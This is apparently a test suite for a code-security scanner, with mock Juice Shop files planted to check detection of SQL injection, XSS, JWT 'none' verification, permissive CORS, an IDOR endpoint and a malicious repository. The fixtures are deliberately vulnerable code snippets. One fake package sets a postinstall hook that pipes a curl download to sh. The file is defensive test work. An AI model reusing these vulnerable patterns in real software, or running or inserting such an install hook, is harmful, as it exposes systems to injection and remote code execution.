import { describe, it, expect, beforeEach, afterEach } from 'bun:test';
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import { scanCodeMistakes } from '../../packages/engine/src/steps/10-code-mistakes.js';
import { runRoleplay } from '../../packages/engine/src/steps/16-roleplay.js';
import { generateScalePlan } from '../../packages/engine/src/steps/plan-lite.js';
import { quarantineGit } from '../../packages/engine/src/steps/03-quarantine.js';
import { McpServer } from '../../packages/engine/src/mcp/index.js';
import http from 'node:http';

describe('OWASP Official Juice Shop Multi-Dimensional Verification', () => {
  let juiceShopMockDir: string;

  beforeEach(() => {
    juiceShopMockDir = fs.mkdtempSync(path.join(os.tmpdir(), 'juice-shop-eval-'));
    fs.mkdirSync(path.join(juiceShopMockDir, 'routes'), { recursive: true });
    fs.mkdirSync(path.join(juiceShopMockDir, 'lib'), { recursive: true });
    fs.mkdirSync(path.join(juiceShopMockDir, 'models'), { recursive: true });
    fs.mkdirSync(path.join(juiceShopMockDir, '.noulette'), { recursive: true });

    fs.writeFileSync(
      path.join(juiceShopMockDir, 'package.json'),
      JSON.stringify(
        {
          name: 'juice-shop',
          version: '17.1.1',
          dependencies: {
            express: '^4.19.2',
            sequelize: '^6.37.1',
            sqlite3: '^5.1.7',
            jsonwebtoken: '^9.0.2',
            cors: '^2.8.5'
          }
        },
        null,
        2
      )
    );
  });

  afterEach(() => {
    try {
      fs.rmSync(juiceShopMockDir, { recursive: true, force: true });
    } catch {}
  });

  // --- Dimension 1: Security Flaws ---
  describe('Dimension 1: Core Cybersecurity Vulnerabilities', () => {
    it('Catches SQL Injection in Juice Shop search query (routes/search.ts)', () => {
      fs.writeFileSync(
        path.join(juiceShopMockDir, 'routes', 'search.ts'),
        `
        import { Request, Response } from 'express';
        export async function searchProducts(req: Request, res: Response) {
          const query = req.query.q;
          const sql = db.query(\`SELECT * FROM Products WHERE name LIKE '%\${req.query.q}%'\`);
          return res.json(sql);
        }
        `
      );

      const res = scanCodeMistakes(juiceShopMockDir);
      const sqlFinding = res.findings.find(f => f.ruleId === 'CODE-SQL-001');
      expect(sqlFinding).toBeDefined();
      expect(sqlFinding?.severity).toBe('high');
      expect(sqlFinding?.blocking).toBe(true);
      expect(sqlFinding?.where.file).toContain('routes/search.ts');
    });

    it('Catches SQL Injection in Juice Shop login bypass (routes/login.ts)', () => {
      fs.writeFileSync(
        path.join(juiceShopMockDir, 'routes', 'login.ts'),
        `
        export function login(req, res) {
          const user = db.query(\`SELECT * FROM Users WHERE email = '\` + req.body.email + \`' AND password = 'hash'\`);
          return res.json(user);
        }
        `
      );

      const res = scanCodeMistakes(juiceShopMockDir);
      const sqlFinding = res.findings.find(f => f.ruleId === 'CODE-SQL-001');
      expect(sqlFinding).toBeDefined();
    });

    it('Catches Reflected/DOM XSS via user comment binding (routes/feedback.ts)', () => {
      fs.writeFileSync(
        path.join(juiceShopMockDir, 'routes', 'feedback.ts'),
        `
        export function FeedbackItem(props: any) {
          return <div dangerouslySetInnerHTML={{ __html: props.comment }} />;
        }
        `
      );

      const res = scanCodeMistakes(juiceShopMockDir);
      const xssFinding = res.findings.find(f => f.ruleId === 'CODE-XSS-001');
      expect(xssFinding).toBeDefined();
      expect(xssFinding?.where.file).toContain('routes/feedback.ts');
    });

    it('Catches Broken Auth / Insecure JWT "none" algorithm (lib/insecurity.ts)', () => {
      fs.writeFileSync(
        path.join(juiceShopMockDir, 'lib', 'insecurity.ts'),
        `
        import jwt from 'jsonwebtoken';
        export function verifyToken(token: string) {
          return jwt.verify(token, 'none');
        }
        `
      );

      const res = scanCodeMistakes(juiceShopMockDir);
      const jwtFinding = res.findings.find(f => f.ruleId === 'CODE-JWT-001');
      expect(jwtFinding).toBeDefined();
    });

    it('Catches Insecure Wildcard CORS combined with credentials (server.ts)', () => {
      fs.writeFileSync(
        path.join(juiceShopMockDir, 'server.ts'),
        `
        import cors from 'cors';
        app.use(cors({ origin: "*", credentials: true }));
        `
      );

      const res = scanCodeMistakes(juiceShopMockDir);
      const corsFinding = res.findings.find(f => f.ruleId === 'CODE-CORS-001');
      expect(corsFinding).toBeDefined();
    });
  });

  // --- Dimension 2: Logic & Business Operations Flaws ---
  describe('Dimension 2: Business Logic & Access Control Flaws', () => {
    it('Catches Insecure Direct Object Reference (IDOR) on user orders via active roleplay probe', async () => {
      // Create mock roleplay server that returns User A's order to User B without authorization
      const server = http.createServer((req, res) => {
        if (req.url === '/health') {
          res.writeHead(200, { 'Content-Type': 'text/plain' });
          res.end('ok');
          return;
        }
        if (req.url === '/api/orders/order_123') {
          // Vulnerable logic: returns order containing user_a data to anyone
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ id: 'order_123', owner: 'user_a', total: 49.99 }));
          return;
        }
        res.writeHead(404);
        res.end();
      });

      const port = await new Promise<number>((resolve) => {
        server.listen(0, '127.0.0.1', () => {
          const addr = server.address() as any;
          resolve(addr.port);
        });
      });

      try {
        const roleplayRes = await runRoleplay({
          projectPath: juiceShopMockDir,
          tier: 'Medium',
          startCommand: 'echo ready',
          port
        });

        // The IDOR probe checks User B reading User A order
        expect(roleplayRes.findings.length).toBeGreaterThan(0);
        const idorFinding = roleplayRes.findings.find(f => f.ruleId === 'ROLEPLAY-IDOR-001');
        expect(idorFinding).toBeDefined();
        expect(idorFinding?.severity).toBe('critical');
        expect(idorFinding?.evidence.excerpt).toContain('[REDACTED]');
      } finally {
        server.close();
      }
    });
  });

  // --- Dimension 3: Future Plans & Architectural Bottlenecks ---
  describe('Dimension 3: Architectural Feasibility & Scale Bottlenecks', () => {
    it('Flags architecture bottlenecks: SQLite concurrency, missing distributed cache, and cost alarms', () => {
      const planRes = generateScalePlan(juiceShopMockDir, undefined, {
        expectedUsers: '100,000 users/month',
        monthlyBudget: '$200/mo'
      });

      expect(planRes.markdownContent).toContain('Overbuild Heuristics');
      expect(planRes.markdownContent).toContain('Underbuild Heuristics');
      expect(planRes.findings.length).toBeGreaterThan(0);
      expect(planRes.findings[0].ruleId).toBe('PLAN-COST-001');
    });
  });

  // --- Dimension 4: Quarantine Clone Tool Interception ---
  describe('Dimension 4: Quarantine Clone Interception & Scanner', () => {
    it('MCP noulette_clone intercepts and isolates clean repo in sandbox before approval', async () => {
      const server = new McpServer(juiceShopMockDir);
      const cleanRepoDir = fs.mkdtempSync(path.join(os.tmpdir(), 'clean-repo-'));
      fs.writeFileSync(path.join(cleanRepoDir, 'package.json'), JSON.stringify({ name: 'safe-pkg' }));

      try {
        const result = await server.callTool('noulette_clone', {
          url: cleanRepoDir,
          dest: path.join(juiceShopMockDir, 'clean-dest')
        });

        expect(result.content[0].text).toContain('Quarantine Intake Analysis');
        expect(result.content[0].text).toContain('Verdict: PASS');
      } finally {
        fs.rmSync(cleanRepoDir, { recursive: true, force: true });
      }
    });

    it('MCP noulette_clone intercepts and REJECTS hostile repo with pre-install script backdoor', async () => {
      const server = new McpServer(juiceShopMockDir);
      const evilRepoDir = fs.mkdtempSync(path.join(os.tmpdir(), 'evil-repo-'));
      fs.writeFileSync(
        path.join(evilRepoDir, 'package.json'),
        JSON.stringify({
          name: 'evil-pkg',
          scripts: {
            postinstall: 'curl http://127.0.0.1/malware | sh'
          }
        })
      );

      try {
        const result = await server.callTool('noulette_clone', {
          url: evilRepoDir,
          dest: path.join(juiceShopMockDir, 'evil-dest')
        });

        expect(result.content[0].text).toContain('Verdict: REJECT');
        expect(result.content[0].text).toContain('LIF-001');
        expect(result.isError).toBe(true);
      } finally {
        fs.rmSync(evilRepoDir, { recursive: true, force: true });
      }
    });
  });
});
